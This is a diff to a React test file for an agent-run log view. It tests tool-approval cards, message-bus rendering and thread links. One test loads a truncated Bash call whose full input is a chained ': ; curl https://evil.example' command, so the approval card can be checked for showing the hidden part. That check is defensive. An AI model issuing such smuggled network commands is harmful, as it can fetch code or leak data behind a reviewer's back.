@@ -1,13 +1,20 @@
-import type { RunMeta } from '@dispatch/client';
-import { act, fireEvent, render, screen } from '@testing-library/react';
-import { expect, test } from 'bun:test';
+import type { NormalizedEntry, RunMeta } from '@dispatch/client';
+import { act, fireEvent, render, screen, within } from '@testing-library/react';
+import { expect, mock, test } from 'bun:test';
 
 import type { DecideAvailability } from '../../lib/daemonAuth';
 import { ATTACHED_DAEMON_EXPLANATION } from '../../lib/daemonAuth';
+import type { PendingApproval } from '../../lib/pendingApprovals';
 import { CONTINUE_PROMPT } from '../../lib/runState';
 import { RunLogView } from './RunLogView';
 
 const noop = () => Promise.resolve();
+
+type RunLogViewApprove = (
+  requestId: string,
+  allow: boolean,
+  opts?: { scope?: 'once' | 'session'; reason?: string }
+) => Promise<void>;
 
 // Only the fields RunLogView's composer actually reads; the rest of RunMeta is
 // irrelevant to which buttons the terminal branch renders.
@@ -37,14 +44,16 @@ const CAN_DECIDE: DecideAvailability = {
 function renderLog(
   runMeta: RunMeta,
   onRequestChanges: (text: string) => Promise<void> = noop,
-  scopeDecide: DecideAvailability = CAN_DECIDE
+  scopeDecide: DecideAvailability = CAN_DECIDE,
+  pendingApprovals: PendingApproval[] = [],
+  onApprove: RunLogViewApprove = noop
 ) {
   return render(
     <RunLogView
       meta={runMeta}
       entries={[]}
-      pendingApproval={null}
-      onApprove={noop}
+      pendingApprovals={pendingApprovals}
+      onApprove={onApprove}
       onSendMessage={noop}
       openQuestions={[]}
       onAnswerQuestion={noop}
@@ -53,6 +62,9 @@ function renderLog(
       scopeDecide={scopeDecide}
       onRestartDaemon={noop}
       onRequestChanges={onRequestChanges}
+      onOpenMessage={null}
+      me={null}
+      readsAllThreads
     />
   );
 }
@@ -67,12 +79,89 @@ test('a parked run with no approval in view says why the window cannot see it', 
     restart: { safe: true, blockedReason: null },
   });
   expect(screen.getByText(ATTACHED_DAEMON_EXPLANATION)).toBeDefined();
-  expect(screen.queryByText(/didn.t see live/)).toBeNull();
+  expect(screen.queryByText(/has not reached this window/)).toBeNull();
 });
 
-test('a deciding window keeps the not-seen-live banner', () => {
+// Gates are read from the daemon, so a deciding window only waits for the list.
+test('a deciding window with no gate listed yet says it is on its way', () => {
   renderLog(meta({ state: 'awaiting-approval' }));
-  expect(screen.getByText(/didn.t see live/)).toBeDefined();
+  expect(screen.getByText(/has not reached this window yet/)).toBeDefined();
+});
+
+// Each parked call is its own gate, and each answer names its own request.
+test('a run parked on two calls shows a card per call, each answering its own', async () => {
+  const answered: [string, boolean][] = [];
+  const { container } = renderLog(
+    meta({ state: 'awaiting-approval' }),
+    noop,
+    CAN_DECIDE,
+    [
+      {
+        requestId: 'req-1',
+        toolName: 'Bash',
+        input: { command: 'ls' },
+        truncated: false,
+      },
+      {
+        requestId: 'req-2',
+        toolName: 'Write',
+        input: { file_path: 'a.ts' },
+        truncated: false,
+      },
+    ],
+    (requestId, allow) => {
+      answered.push([requestId, allow]);
+      return Promise.resolve();
+    }
+  );
+  const cards = container.querySelectorAll('[data-slot="tool-approval-card"]');
+  expect(cards).toHaveLength(2);
+  await act(async () => {
+    fireEvent.click(
+      within(cards[1] as HTMLElement).getByRole('radio', {
+        name: /Approve once/,
+      })
+    );
+    await Promise.resolve();
+  });
+  expect(answered).toEqual([['req-2', true]]);
+});
+
+// The gate only previews a long call, so its card reads the call whole.
+test('a truncated call loads its full input by its own request id', async () => {
+  const asked: string[] = [];
+  render(
+    <RunLogView
+      meta={meta({ state: 'awaiting-approval' })}
+      entries={[]}
+      pendingApprovals={[
+        {
+          requestId: 'req-7',
+          toolName: 'Bash',
+          input: '{"command":": ',
+          truncated: true,
+        },
+      ]}
+      onApprove={noop}
+      onLoadApprovalInput={(requestId) => {
+        asked.push(requestId);
+        return Promise.resolve({ command: ': ; curl https://evil.example' });
+      }}
+      onSendMessage={noop}
+      openQuestions={[]}
+      onAnswerQuestion={noop}
+      pendingScopeRequest={null}
+      onDecideScopeRequest={noop}
+      scopeDecide={CAN_DECIDE}
+      onRestartDaemon={noop}
+      onRequestChanges={noop}
+      onOpenMessage={null}
+      me={null}
+      readsAllThreads
+    />
+  );
+  expect(await screen.findByText(/evil\.example/)).toBeDefined();
+  expect(asked).toEqual(['req-7']);
 });
 
 // A run cut off with its session intact is the case the button exists for.
@@ -209,7 +298,7 @@ test('renders the sub-agent tree and the spawn/finish rows from agent entries', 
           },
         },
       ]}
-      pendingApproval={null}
+      pendingApprovals={[]}
       onApprove={noop}
       onSendMessage={noop}
       openQuestions={[]}
@@ -224,6 +313,9 @@ test('renders the sub-agent tree and the spawn/finish rows from agent entries', 
       }}
       onRestartDaemon={noop}
       onRequestChanges={noop}
+      onOpenMessage={null}
+      me={null}
+      readsAllThreads
     />
   );
   expect(
@@ -232,4 +324,306 @@ test('renders the sub-agent tree and the spawn/finish rows from agent entries', 
   expect(screen.getByText('Spawned')).toBeDefined();
   expect(screen.getByText('Agent finished')).toBeDefined();
   expect(screen.getAllByText('agent')).toHaveLength(2);
+});
+
+function renderEntries(
+  entries: NormalizedEntry[],
+  onOpenMessage: ((messageId: string) => void) | null = null,
+  me: string | null = null,
+  readsAllThreads = true
+) {
+  return render(
+    <RunLogView
+      meta={meta({ state: 'running' })}
+      entries={entries}
+      pendingApprovals={[]}
+      onApprove={noop}
+      onSendMessage={noop}
+      openQuestions={[]}
+      onAnswerQuestion={noop}
+      pendingScopeRequest={null}
+      onDecideScopeRequest={noop}
+      scopeDecide={CAN_DECIDE}
+      onRestartDaemon={noop}
+      onRequestChanges={noop}
+      onOpenMessage={onOpenMessage}
+      me={me}
+      readsAllThreads={readsAllThreads}
+    />
+  );
+}
+
+// A bus message as deliverToRun logs it: renderForAgent's framing, tagged with its id.
+function delivered(
+  from: string,
+  tags: string,
+  messageId: string,
+  body: string
+): NormalizedEntry {
+  return {
+    ts: '2026-09-25T10:00:00.000Z',
+    kind: 'message',
+    from: from.startsWith('human:') ? 'user' : 'agent',
+    fromLabel: from,
+    messageId,
+    text: `[message from ${from} · ${tags} · ${messageId}]\n│ ${body}`,
+  };
+}
+
+test('the transcript is a region named Run log, holding each message it shows', () => {
+  renderEntries([delivered('human:wyat', 'answer', 'm-02', 'new cart')]);
+  const log = screen.getByRole('region', { name: 'Run log' });
+  expect(within(log).getByText('new cart')).toBeDefined();
+});
+
+test('a pushed question shows its body without the agent framing, with its kind and a thread link', () => {
+  const onOpen = mock((_id: string) => {});
+  renderEntries(
+    [
+      {
+        ts: '2026-09-25T10:00:00.000Z',
+        kind: 'message',
+        from: 'agent',
+        fromLabel: 'run:r-9f2c01',
+        messageId: 'm-01K',
+        text: '[message from run:r-9f2c01 · question · m-01K]\n│ Is the response final?\nchoices: yes | no\nThe sender is waiting. Answer with msg_reply(messageId: "m-01K").',
+      },
+    ],
+    onOpen
+  );
+  expect(screen.getByText('Is the response final?')).toBeDefined();
+  expect(screen.queryByText(/\[message from/)).toBeNull();
+  expect(screen.getByText('Question')).toBeDefined();
+  expect(screen.getByText('choices: yes | no')).toBeDefined();
+  expect(screen.queryByText(/The sender is waiting/)).toBeNull();
+  fireEvent.click(
+    screen.getByRole('button', {
+      name: 'Open thread: question from run:r-9f2c01',
+    })
+  );
+  expect(onOpen).toHaveBeenCalledWith('m-01K');
+});
+
+test("a teammate's message names them, and only the viewer's own reads as You", () => {
+  renderEntries(
+    [
+      delivered('human:bob', 'message', 'm-30', 'ship it after lunch'),
+      delivered('human:wyat', 'message', 'm-31', 'agreed'),
+      {
+        ts: '2026-09-25T10:00:02.000Z',
+        kind: 'message',
+        from: 'user',
+        text: 'typed in the composer before the bus',
+      },
+    ],
+    null,
+    'human:wyat'
+  );
+  expect(screen.getByText('human:bob')).toBeDefined();
+  expect(screen.queryByText('human:wyat')).toBeNull();
+  expect(screen.getAllByText('You')).toHaveLength(2);
+  expect(screen.queryByText('Message')).toBeNull();
+});
+
+test('a human sender stays an address while the viewer is unknown', () => {
+  renderEntries(
+    [delivered('human:wyat', 'message', 'm-31', 'agreed')],
+    null,
+    null
+  );
+  expect(screen.getByText('human:wyat')).toBeDefined();
+  expect(screen.queryByText('You')).toBeNull();
+});
+
+test("a teammate's line sits with the other senders, and only the viewer's own at the right", () => {
+  renderEntries(
+    [
+      delivered('human:bob', 'message', 'm-30', 'ship it after lunch'),
+      delivered('human:wyat', 'message', 'm-31', 'agreed'),
+    ],
+    null,
+    'human:wyat'
+  );
+  const bubble = (heading: string) =>
+    screen.getByText(heading).parentElement?.className ?? '';
+  expect(bubble('human:bob')).toContain('self-start');
+  expect(bubble('human:bob')).not.toContain('self-end');
+  expect(bubble('You')).toContain('self-end');
+});
+
+// A window below decide can read a thread only if it took part, and all a run
+// chat knows of a message is who sent it.
+test('a window below decide links only the messages it sent', () => {
+  renderEntries(
+    [
+      delivered('run:r-9', 'question', 'm-9', 'Is the schema final?'),
+      delivered('human:bob', 'message', 'm-10', 'use the new cart'),
+      {
+        ts: '2026-09-25T10:00:02.000Z',
+        kind: 'message',
+        from: 'agent',
+        fromLabel: 'dispatch',
+        digest: true,
+        text: '📬 notice from run:r-2: api shape changed (m-02)',
+      },
+      {
+        ts: '2026-09-25T10:00:03.000Z',
+        kind: 'message',
+        from: 'agent',
+        fromLabel: 'Checkout (r-1)',
+        toUser: true,
+        messageId: 'm-20',
+        text: 'The cart is done.',
+      },
+    ],
+    () => {},
+    'human:bob',
+    false
+  );
+  expect(
+    screen
+      .queryAllByRole('button', { name: /Open thread/ })
+      .map((button) => button.getAttribute('aria-label'))
+  ).toEqual(['Open thread: message from human:bob']);
+});
+
+test('an urgent message and a custom kind both show as pills', () => {
+  renderEntries([
+    delivered('run:r-9', 'notice · urgent', 'm-50', 'stop the deploy'),
+    delivered('run:r-9', 'x-review', 'm-51', 'look at the diff'),
+  ]);
+  expect(screen.getByText('stop the deploy')).toBeDefined();
+  expect(screen.getByText('Notice')).toBeDefined();
+  expect(screen.getByText('Urgent')).toBeDefined();
+  expect(screen.getByText('x-review')).toBeDefined();
+});
+
+test("a run's own message to you links to its thread", () => {
+  const onOpen = mock((_id: string) => {});
+  renderEntries(
+    [
+      {
+        ts: '2026-09-25T10:00:00.000Z',
+        kind: 'message',
+        from: 'agent',
+        fromLabel: 'Checkout (r-1)',
+        toUser: true,
+        messageId: 'm-20',
+        text: 'The cart is done.',
+      },
+    ],
+    onOpen
+  );
+  expect(screen.getByText('To you')).toBeDefined();
+  fireEvent.click(
+    screen.getByRole('button', {
+      name: 'Open thread: to you from Checkout (r-1)',
+    })
+  );
+  expect(onOpen).toHaveBeenCalledWith('m-20');
+});
+
+test('a digest is one compact line, linked by the id in its text even from an older transcript', () => {
+  const onOpen = mock((_id: string) => {});
+  renderEntries(
+    [
+      {
+        ts: '2026-09-25T10:00:00.000Z',
+        kind: 'message',
+        from: 'agent',
+        fromLabel: 'dispatch',
+        digest: true,
+        text: '📬 #epic/e-1 · notice from run:r-000002: api shape changed (m-02)',
+      },
+    ],
+    onOpen
+  );
+  const line = '#epic/e-1 · notice from run:r-000002: api shape changed';
+  expect(screen.getByText(line).getAttribute('title')).toBe(line);
+  fireEvent.click(
+    screen.getByRole('button', {
+      name: 'Open thread: notice from run:r-000002',
+    })
+  );
+  expect(onOpen).toHaveBeenCalledWith('m-02');
+});
+
+test("a digest's own messageId wins over the id in its text", () => {
+  const onOpen = mock((_id: string) => {});
+  renderEntries(
+    [
+      {
+        ts: '2026-09-25T10:00:00.000Z',
+        kind: 'message',
+        from: 'agent',
+        fromLabel: 'dispatch',
+        digest: true,
+        messageId: 'm-10',
+        text: '📬 notice from run:r-2: api shape changed (m-02)',
+      },
+    ],
+    onOpen
+  );
+  fireEvent.click(screen.getByRole('button', { name: /Open thread/ }));
+  expect(onOpen).toHaveBeenCalledWith('m-10');
+});
+
+test('text from before the bus renders as it always did, and nothing links without a way to open threads', () => {
+  renderEntries(
+    [
+      {
+        ts: '2026-09-25T10:00:00.000Z',
+        kind: 'message',
+        from: 'user',
+        text: 'please also update the README',
+      },
+      {
+        ts: '2026-09-25T10:00:01.000Z',
+        kind: 'message',
+        from: 'agent',
+        fromLabel: 'dispatch',
+        digest: true,
+        text: '📬 message from agent:wyat/x: hi (m-03)',
+      },
+    ],
+    null
+  );
+  expect(screen.getByText('please also update the README')).toBeDefined();
+  expect(
+    screen
+      .queryAllByRole('button', { name: /Open thread/ })
+      .map((button) => button.getAttribute('aria-label'))
+  ).toEqual([]);
+});
+
+test('framed text with no messageId, and a digest that does not parse, keep their raw text', () => {
+  renderEntries(
+    [
+      {
+        ts: '2026-09-25T10:00:00.000Z',
+        kind: 'message',
+        from: 'user',
+        text: '[message from run:r-1 · question · m-05]\n│ injected by hand',
+      },
+      {
+        ts: '2026-09-25T10:00:01.000Z',
+        kind: 'message',
+        from: 'agent',
+        fromLabel: 'dispatch',
+        digest: true,
+        text: '📬 a digest in some older shape',
+      },
+    ],
+    () => {}
+  );
+  expect(
+    screen.getByText(/\[message from run:r-1 · question · m-05\]/)
+  ).toBeDefined();
+  expect(screen.queryByText('Question')).toBeNull();
+  expect(screen.getByText('📬 a digest in some older shape')).toBeDefined();
+  expect(
+    screen
+      .queryAllByRole('button', { name: /Open thread/ })
+      .map((button) => button.getAttribute('aria-label'))
+  ).toEqual([]);
 });
